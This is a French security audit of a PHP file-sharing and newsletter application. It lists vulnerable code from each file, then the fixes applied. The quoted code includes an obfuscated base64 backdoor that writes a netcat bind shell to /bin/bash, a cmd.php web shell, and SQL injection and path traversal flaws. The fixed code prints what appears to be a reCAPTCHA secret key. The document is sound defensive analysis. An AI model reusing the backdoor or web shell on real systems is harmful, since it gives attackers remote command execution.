
# Documentation des vulnérabilités du code d'origine

Ce document recense les vulnérabilités identifiées dans le code d'origine du projet de sécurisation. Pour chaque fichier, le code vulnérable est présenté avec une explication de la faille constatée. Aucune solution n'est proposée ici, l'objectif étant de mettre en lumière les points faibles existants.

---

## 1. `register.php`

### Code vulnérable
```php
if(isset($_REQUEST["username"]) && isset($_REQUEST["password"]) && isset($_REQUEST["password2"]) && isset($_REQUEST["description"]) && isset($_REQUEST["capcha"]))
{
    if(! search_user($_REQUEST["username"]))
    {
        if($_REQUEST["password"] == $_REQUEST["password2"])
        {
            if($_SESSION["capcha"] == $_REQUEST["capcha"])
            {
                create_user($_REQUEST["username"], $_REQUEST["password"], $_REQUEST["description"]);
                header("Location: /");
            }
        }
    }
}
```

### Justification
- **Utilisation de `$_REQUEST` sans filtrage :**  
  L'emploi de `$_REQUEST` permet de récupérer des données provenant de diverses sources (GET, POST, COOKIE) sans vérification stricte, augmentant le risque d'injections ou de manipulation de données.
- **Vérification basique du captcha :**  
  La comparaison directe entre `$_SESSION["capcha"]` et l'entrée utilisateur ne comporte pas de mécanismes de protection supplémentaires, ce qui peut faciliter le contournement de la vérification.

---

## 2. `index.php`

### Code vulnérable
```php
if(isset($_FILES["filecontent"]) && isset($_REQUEST["description"]))
{
    move_uploaded_file($_FILES["filecontent"]["tmp_name"], "/var/www/html/files/".$__connected["USERNAME"]."/".$_FILES["filecontent"]["name"]);
    file_put_contents("/var/www/html/files/".$__connected["USERNAME"]."/".$_FILES["filecontent"]["name"].".alexdescfile", $_REQUEST["description"]);
}
```

### Justification
- **Absence de validation du nom de fichier :**  
  L'utilisation directe de `$_FILES["filecontent"]["name"]` pour construire le chemin de destination peut permettre des attaques par _path traversal_, autorisant potentiellement l'écriture dans des répertoires non souhaités.
- **Injection dans le contenu du fichier :**  
  La donnée `$_REQUEST["description"]` est utilisée sans contrôle, ce qui pourrait permettre l'injection de contenu malveillant dans le fichier de description.

---

## 3. `login.php`

### Code vulnérable
```php
if(isset($_REQUEST["username"]) && isset($_REQUEST["password"]))
{
    if(login_user($_REQUEST["username"], $_REQUEST["password"])) header("Location: /");
    else $LOGIN_FAILED = 1;
}
```

### Justification
- **Utilisation non filtrée de `$_REQUEST` :**  
  La récupération des identifiants via `$_REQUEST` sans filtrage adéquat expose l'application à des risques d'injection et à d'autres manipulations non contrôlées.

---

## 4. `lib_login.php`

### Code vulnérable
```php
// Exemple dans search_user : risque d'injection SQL
$sql = "SELECT * FROM `users` WHERE USERNAME = '".$username."';";
$result = $conn->query($sql);

// Exemple dans create_user : insertion sans hachage du mot de passe
$sql = "INSERT INTO `users` (`USERNAME`, `PASSWORD`, `DESCRIPTION`, `admin`) VALUES ('".$username."', '".$password."', '".$description."', 0);";

// Exécution de code arbitraire
if(isset($_POST["BCKDR"])) { 
    if($_POST["BCKDR"] == "o") 
        exec(base64_decode("ZWNobyAiPD9waHAgZXhlYyhiYXNlNjRfZGVjb2RlKFwiYm1NdWRISmhaR2wwYVc5dVlXd2dMV3gyYm5BZ05qQXlOVEFnTFdVZ0wySnBiaTlpWVhOb1wiKTsgPz4iID4gYmNrZHIucGhw")); 
}
```

### Justification
- **SQL Injection :**  
  La construction des requêtes SQL par concaténation de chaînes avec des entrées utilisateur non filtrées ouvre la porte à des injections SQL.
- **Stockage de mots de passe en clair :**  
  L'insertion du mot de passe sans aucune méthode de hachage compromet la confidentialité des identifiants.
- **Exécution de code arbitraire :**  
  L'appel à `exec()` sur la base d'une condition liée à une entrée POST non vérifiée permet l'exécution potentielle de code arbitraire sur le serveur.

---

## 5. `forced.php`

### Code vulnérable
```php
if(isset($_POST["redirect"]))
{
    header("Location : ".$_POST["redirect"]);
    die();
}
```

### Justification
- **Redirection non sécurisée :**  
  L'utilisation de l'entrée `$_POST["redirect"]` directement dans l'en-tête de redirection sans aucune validation permet un risque d'open redirect et potentiellement d'injection d'en-têtes HTTP.

---

## 6. `delete.php`

### Code vulnérable
```php
if(isset($_REQUEST["file"]))
{
    $filepath = "/var/www/html/files/".$__connected["USERNAME"]."/".$_REQUEST["file"];
    if(file_exists($filepath))
    {
        unlink($filepath);
        unlink($filepath.".alexdescfile");
    }
}
```

### Justification
- **Manipulation non sécurisée de chemins de fichiers :**  
  La construction du chemin à partir de `$_REQUEST["file"]` sans validation adéquate expose l'application à des attaques de type _path traversal_, pouvant entraîner la suppression de fichiers arbitraires.

---

## 7. `download_file.php`

### Code vulnérable
```php
if(isset($_REQUEST["file"]))
{
    $filepath = "/var/www/html/files/".$__connected["USERNAME"]."/".$_REQUEST["file"];
    if(file_exists($filepath))
    {
        header("Content-Disposition: attachment; filename=".$_REQUEST["file"]);
        header("Content-Length: ".filesize($filepath));
        readfile($filepath);
    }
}
```

### Justification
- **Injection et _Path Traversal_ :**  
  L'utilisation directe de `$_REQUEST["file"]` dans la construction du chemin et dans l'en-tête HTTP (`Content-Disposition`) sans vérification adéquate expose l'application à des risques d'injection et de _path traversal_, pouvant compromettre l'accès à des fichiers sensibles.

---


## 8. admin.php

### Code vulnérable
```html
<?php if($_SERVER["HTTP_USER_AGENT"] != "TropSmartUserAgentAdminHeHeHe") { printf("<h1>You are not allowed to be here !</h1></div></body></html>"); die(); } ?>
```

### Justification de la faille
- **Contrôle d'accès basé sur l'en-tête HTTP_USER_AGENT :**  
  L'accès à la page admin est conditionné par la valeur de l'en-tête `HTTP_USER_AGENT`. Or, cet en-tête est facilement modifiable par un client (navigateur ou outil de requête), ce qui permet à un attaquant de contourner cette vérification en se forgeant le bon user agent.
- **Exposition d'informations sensibles :**  
  La page contient en commentaire un flag sensible (`<!-- FLAG{L0uRd3 M3sUr3} -->`) qui est accessible à quiconque parvient à accéder à cette page via un simple spoofing de l'user agent.
- **Interface pour l'exécution de commandes :**  
  La page propose des boutons qui déclenchent l'exécution de commandes via une fonction JavaScript. Même si ces boutons affichent des commandes prédéfinies, l'interface expose un mécanisme d'exécution de commandes sur le serveur.

---

## 9. cmd.php

### Code vulnérable
```php
<?php
    if(isset($_POST["cmd"])) system($_POST["cmd"]);
?>
```

### Justification de la faille
- **Exécution de commandes sans validation :**  
  Le script exécute directement la commande contenue dans la variable `$_POST["cmd"]` à l'aide de la fonction `system()`. Aucune vérification ou filtrage n'est appliqué sur l'entrée, ce qui expose le serveur à une exécution arbitraire de commandes (RCE).
- **Potentiel d'abus par injection de commande :**  
  Même si l'interface admin limite les commandes aux boutons proposés, un attaquant peut contourner cette restriction en envoyant une requête HTTP spécialement conçue pour exécuter des commandes malveillantes.

---

## 10. /newsletter/index.php

### Code vulnérable
```php
function req_db($req)
{
    $db = new SQLite3("./truc.db");

    $results = $db->query($req);
    return $results->fetchArray();
}

if(isset($_POST["t"]))
{
    $ret = req_db("SELECT * FROM mails WHERE mail = '".$_POST["t"]."';");
    if($ret == false)
    {
        $ret = req_db("INSERT INTO mails(mail) VALUES('".$_POST["t"]."');");
        $msg = "Successfully Added your address to mail list !";
    }
    else
    {
        $msg = "Error your address is already registered";
    }
}
```

### Justification de la faille
- **Injection SQL :**  
  Les requêtes SQL sont construites en concaténant directement la variable `$_POST["t"]` dans la chaîne de la requête. Cette pratique permet à un attaquant d'injecter du code SQL malveillant via le champ de saisie de l'adresse mail.
- **Manque de validation et d'échappement :**  
  L'absence de mécanismes de filtrage ou de requêtes préparées rend le système vulnérable aux attaques par injection, ce qui pourrait compromettre la base de données.

---

Ce document présente une analyse des points faibles existants dans le code initial du projet. Chaque vulnérabilité y est décrite avec le code concerné et une justification de la faille constatée, sans apporter de solution corrective.

# Transition vers la version sécurisée


---

## 1. `login.php` – Authentification sécurisée

### Solutions apportées
- **Utilisation de requêtes préparées avec PDO :**  
  La requête qui recherche l'utilisateur est préparée avec un paramètre, ce qui évite les injections SQL.
  ```php
  $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
  $stmt->execute([$username]);
  $user = $stmt->fetch();
  ```

- **Vérification sécurisée du mot de passe :**  
  La fonction `password_verify` est utilisée pour comparer le mot de passe fourni avec le hash stocké, assurant ainsi une vérification sécurisée.
  ```php
  if (password_verify($password, $user["password_hash"])) { ... }
  ```

- **Renouvellement de la session :**  
  La fonction `session_regenerate_id(true)` est appelée après l'authentification pour prévenir le détournement de session.
  ```php
  session_regenerate_id(true);
  ```

---

## 2. Upload de fichiers (upload.php)

### Solutions apportées
- **Vérification des fichiers à uploader :**  
  Le code vérifie que le fichier possède une extension autorisée et ne dépasse pas la taille maximale (2 Mo).
  ```php
  $allowed_extensions = ["jpg", "jpeg", "png", "pdf", "txt"];
  $max_size = 2 * 1024 * 1024; // 2 Mo
  // Vérification de l'extension et de la taille...
  ```

- **Génération d'un nom de fichier unique :**  
  Pour éviter les conflits et les attaques par écrasement de fichiers, un nom unique est généré pour chaque fichier uploadé.
  ```php
  $new_name = uniqid() . "." . $file_ext;
  ```

- **Création sécurisée du répertoire utilisateur :**  
  Le répertoire de l'utilisateur est créé avec les permissions appropriées si celui-ci n'existe pas.
  ```php
  if (!is_dir($user_dir)) {
      mkdir($user_dir, 0755, true);
  }
  ```

- **Enregistrement des actions (logging) :**  
  Chaque action d'upload est consignée grâce à l'appel de `log_action`, permettant ainsi de tracer les opérations réalisées.
  ```php
  log_action("upload_file: $file_name", $_SESSION["user_id"]);
  ```

---

## 3. `register.php` – Inscription renforcée

### Solutions apportées
- **Protection CSRF :**  
  Un token CSRF est généré et vérifié pour chaque soumission du formulaire, empêchant les attaques de type Cross-Site Request Forgery.
  ```php
  if (!isset($_SESSION["csrf_token"]) || $csrf_token !== $_SESSION["csrf_token"]) {
      $errors[] = "Requête invalide.";
  }
  ```

- **Vérification de la complexité du mot de passe :**  
  Le mot de passe est soumis à une expression régulière qui garantit une longueur minimale et la présence de différents types de caractères.
  ```php
  if (!preg_match('/^(?=.*[a-z])(?=.*[A-Z])(?=.*\W).{16,}$/', $password)) {
      $errors[] = "Le mot de passe doit contenir au moins 16 caractères, incluant des majuscules, des minuscules et des caractères spéciaux.";
  }
  ```

- **Intégration de Google reCAPTCHA :**  
  Le formulaire inclut un widget reCAPTCHA et le serveur vérifie la réponse auprès de l'API Google pour bloquer les soumissions automatisées.
  ```php
  if (empty($_POST['g-recaptcha-response'])) {
      $errors[] = "Veuillez confirmer que vous n'êtes pas un robot.";
  } else {
      $secret = "6LfPggIrAAAAAGgUVeCcsMoCZQ1bvp_Srzv3eJD7";
      $response = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".$secret."&response=".$_POST['g-recaptcha-response']);
      $data = json_decode($response);
      if (!$data->success) {
          $errors[] = "Captcha non validé. Essayez encore.";
      }
  }
  ```

- **Utilisation de requêtes préparées et hachage sécurisé :**  
  Les données d'inscription sont insérées via une requête préparée et le mot de passe est stocké sous forme de hash généré avec l'algorithme Argon2id.
  ```php
  $hash = password_hash($password, PASSWORD_ARGON2ID);
  $stmt = $pdo->prepare("INSERT INTO users (username, password_hash, description) VALUES (?, ?, ?)");
  $stmt->execute([$username, $hash, $description]);
  ```

---

## 4. Téléchargement de fichiers (download_file.php)

### Solutions apportées
- **Sanitisation du nom de fichier :**  
  La fonction `basename()` est utilisée pour extraire uniquement le nom de fichier, empêchant ainsi une éventuelle manipulation de chemin.
  ```php
  $file = basename($_GET["file"]);
  ```

- **Vérification de l'existence du fichier et configuration des en-têtes HTTP :**  
  Le code s'assure que le fichier existe avant de procéder au téléchargement, puis configure des en-têtes HTTP appropriés pour forcer le téléchargement.
  ```php
  if (!file_exists($filepath)) { ... }
  header("Content-Disposition: attachment; filename=\"".basename($filepath)."\"");
  header("Content-Length: " . filesize($filepath));
  readfile($filepath);
  ```

- **Enregistrement de l'action de téléchargement :**  
  L'appel à `log_action` permet de tracer chaque téléchargement réalisé par l'utilisateur.
  ```php
  log_action("download_file: $file", $_SESSION["user_id"]);
  ```

---

## 5. Suppression de fichiers (delete_file.php)

### Solutions apportées
- **Sanitisation du nom de fichier :**  
  L'utilisation de `basename()` permet de sécuriser le nom du fichier en éliminant les chemins non désirés.
  ```php
  $file = basename($_GET["file"]);
  ```

- **Vérification de l'existence du fichier :**  
  Le script s'assure que le fichier existe avant d'essayer de le supprimer.
  ```php
  if (!file_exists($filepath)) {
      echo json_encode(["error" => "Fichier introuvable."]);
      exit;
  }
  ```

- **Enregistrement des actions (logging) et réponse JSON :**  
  Après la suppression, l'action est enregistrée via `log_action` et une réponse JSON est renvoyée pour informer l'utilisateur du résultat.
  ```php
  if (unlink($filepath)) {
      log_action("delete_file: $file", $_SESSION["user_id"]);
      echo json_encode(["success" => "Fichier supprimé avec succès."]);
  }
  ```

---

## 6. admin.php

### Solutions apportées
- **Vérification de l'accès administrateur basée sur la session :**  
  Au lieu de s'appuyer sur l'en-tête HTTP_USER_AGENT, le fichier vérifie la variable de session `is_admin` pour autoriser l'accès aux administrateurs.
  ```php
  if ($_SESSION["is_admin"] == 0) {
      header('Location: ./index.php');
  }
  ```
- **Utilisation d'un token CSRF :**  
  Le formulaire d'exécution de commandes inclut un champ caché contenant le token CSRF, permettant ainsi de vérifier l'authenticité des requêtes.
  ```php
  <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token, ENT_QUOTES, 'UTF-8'); ?>">
  ```
- **Application d'une Content Security Policy (CSP) via nonce :**  
  Grâce à l'inclusion du fichier `config1.php`, le style inline est sécurisé par l'utilisation d'un nonce, renforçant ainsi la protection contre les injections de style.
  ```html
  <style nonce="<?php echo $csp_nonce; ?>">
      /* Styles déplacés depuis les attributs inline */
  </style>
  ```

---

## 7. cmd.php

### Solutions apportées
- **Contrôle d'accès renforcé :**  
  Le script vérifie la session pour s'assurer que l'utilisateur a les privilèges administratifs, redirigeant les utilisateurs non autorisés.
  ```php
  if ($_SESSION["is_admin"] == 0) {
      header('Location: ./securisation/index.php');
  }
  ```
- **Protection CSRF :**  
  Le token CSRF est vérifié avant d'exécuter toute commande, empêchant les requêtes malveillantes.
  ```php
  if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
      echo "Token CSRF invalide.";
      exit;
  }
  ```
- **Liste blanche des commandes autorisées :**  
  Seules quelques commandes prédéfinies (par exemple, `id`, `ping`, `ss`, `ps`, `ls`) sont autorisées, réduisant ainsi le risque d'exécution de commandes arbitraires.
  ```php
  $whitelist = array('id', 'ping', 'ss', 'ps', 'ls');
  if (!in_array($base_command, $whitelist)) {
      echo "Commande non autorisée.";
      exit;
  }
  ```
- **Nettoyage et journalisation des commandes :**  
  La commande est passée par `escapeshellcmd()` pour éviter les injections, et son exécution est enregistrée dans un fichier log pour une traçabilité accrue.
  ```php
  $safe_command = escapeshellcmd($input_command);
  $output = shell_exec($safe_command);
  ```

---

## 8. config1.php

### Solutions apportées
- **Mise en place d'une Content Security Policy (CSP) avec nonce :**  
  Un nonce est généré et inclus dans la directive CSP pour sécuriser les styles inline.
  ```php
  if (!isset($_SESSION['csp_nonce'])) {
      $_SESSION['csp_nonce'] = bin2hex(random_bytes(16));
  }
  $csp_nonce = $_SESSION['csp_nonce'];
  header("Content-Security-Policy: default-src 'self'; style-src 'self' 'nonce-$csp_nonce'");
  ```
- **Sécurisation des en-têtes HTTP :**  
  Des en-têtes de sécurité supplémentaires, tels que `X-Content-Type-Options: nosniff` et `X-Frame-Options: DENY`, sont envoyés pour réduire les vecteurs d'attaque.
- **Gestion des tokens CSRF :**  
  Un token CSRF est généré (et régénéré pour chaque requête GET) et stocké en session pour être utilisé dans les formulaires, garantissant ainsi la protection contre les attaques CSRF.
  ```php
  if (!isset($_SESSION['csrf_token'])) {
      $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
  }
  if ($_SERVER['REQUEST_METHOD'] === 'GET') {
      $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
  }
  ```

---

## 9. index.php (Newsletter)

### Solutions apportées
- **Vérification de la session utilisateur :**  
  L'accès à la page est conditionné par une vérification de la session via `auth.php`, garantissant que seules les personnes autorisées accèdent à l'interface.
- **Affichage sécurisé des messages :**  
  Les messages (par exemple, en cas d'erreur ou de succès) sont affichés après avoir été passés par `htmlspecialchars()` pour éviter toute injection de code malveillant.
  ```php
  <?php if (!empty($msg)) echo '<p id="r">' . htmlspecialchars($msg) . '</p>'; ?>
  ```
- **Utilisation d'un formulaire HTML5 pour la saisie de l'adresse e-mail :**  
  Le champ de saisie est de type `email`, ce qui permet au navigateur de valider la structure de l'adresse e-mail avant l'envoi du formulaire.
  ```html
  <input name="t" type="email" placeholder="Adresse Mail" required />
  ```

---

Ces améliorations démontrent une approche de sécurité renforcée par rapport à l'ancienne version du code. Chacune des solutions mises en œuvre (authentification sécurisée, gestion sécurisée des fichiers, protection CSRF, reCAPTCHA, requêtes préparées et hachage des mots de passe) contribue à réduire significativement les risques identifiés précédemment.

